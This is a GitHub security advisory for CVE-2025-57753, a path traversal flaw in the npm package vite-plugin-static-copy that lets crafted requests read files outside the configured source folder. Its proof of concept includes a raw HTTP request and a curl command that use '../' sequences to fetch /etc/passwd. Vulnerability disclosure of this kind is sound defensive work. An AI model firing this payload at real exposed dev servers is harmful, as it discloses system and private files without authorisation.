# [M] vite-plugin-static-copy files not included in `src` are possible to access with a crafted request

## Summary
Severity: Medium
Advisory: GHSA-pp7p-q8fx-2968
CVE: CVE-2025-57753
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-08-21
Source: https://github.com/advisories/GHSA-pp7p-q8fx-2968
Type: github-advisory

## Affected
- npm: `vite-plugin-static-copy` — affected >=3.0.0 <3.1.2
- npm: `vite-plugin-static-copy` — affected >=0.4.3 <2.3.2

## Details
### Summary

Files not included in `src` was possible to access with a crafted request.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

Arbitrary files can be disclosed by exploiting this vulnerability.

### Details

Consider the following configuration in used by `vite.config.ts`:

```ts
import { defineConfig } from 'vite'
import { viteStaticCopy } from 'vite-plugin-static-copy'

export default defineConfig({
    plugins: [
      viteStaticCopy({
        targets: [
          {
            src: "./public/images",
            dest: "./",
          },
        ],
      }),
    ],
  });
```

The files under the `./public/images` is only expected to be served. Abusing this vulnerability, an attacker can access arbitrary files on the filesystem.

### PoC
I've attached a demo app to showcase the bug.

Run it with `npm run dev` and issue the following HTTP request

```
GET /static/images/../../../../../../../etc/passwd HTTP/1.1
Host: localhost:3001
Content-Length: 2
```
OR 
```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: localhost:3001' -H $'Content-Length: 2' \
    --data-binary $'\x0d\x0a' \
    $'http://localhost:3001/static/images/../../../../../../../etc/passwd'
```
Observe that the `/etc/passwd` file is included in the response.

<img width="1289" height="449" alt="Screenshot 2025-08-16 at 10 27 11 PM" src="https://github.com/user-attachments/assets/4de12612-7b86-44d7-a403-c76f12832e37" />

## References
- https://github.com/sapphi-red/vite-plugin-static-copy/security/advisories/GHSA-pp7p-q8fx-2968
- https://nvd.nist.gov/vuln/detail/CVE-2025-57753
- https://github.com/sapphi-red/vite-plugin-static-copy/commit/0bc6b49ed72b46eecfc9682045f4b46a19694969
- https://github.com/sapphi-red/vite-plugin-static-copy/commit/4627afb8582083eab733881d3d974e1c1f23997d
- https://github.com/sapphi-red/vite-plugin-static-copy
- https://github.com/sapphi-red/vite-plugin-static-copy/releases/tag/vite-plugin-static-copy%402.3.2
- https://github.com/sapphi-red/vite-plugin-static-copy/releases/tag/vite-plugin-static-copy%403.1.2
